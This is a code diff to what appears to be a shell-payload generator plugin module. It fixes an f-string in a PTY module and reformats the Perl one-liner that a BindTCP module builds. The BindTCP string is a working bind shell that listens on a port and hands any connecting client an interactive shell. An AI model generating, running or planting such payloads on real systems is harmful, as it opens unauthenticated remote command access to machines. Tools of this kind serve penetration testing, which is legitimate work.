@@ -40,7 +40,7 @@ class PTY(plugin.Module):
         self.shell_type = "pty"
 
     def make_shell(self):
-        self.shell = """perl -e 'exec "{self.args.shell}"'"""
+        self.shell = f"""perl -e 'exec "{self.args.shell}"'"""
 
 
 class ReverseUDP(ReverseTCP):
@@ -64,9 +64,9 @@ class BindTCP(plugin.BindShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = f"""perl -e 'use Socket;$p={self.args.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C)"""
-        self.shell += "{"
-        self.shell += f"""open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{self.args.shell} -i");"""
+        self.shell = f"perl -e 'use Socket;$p={self.args.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+        self.shell += "bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){"
+        self.shell += f"open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"{self.args.shell} -i\");"
         self.shell += "};'"
 
 
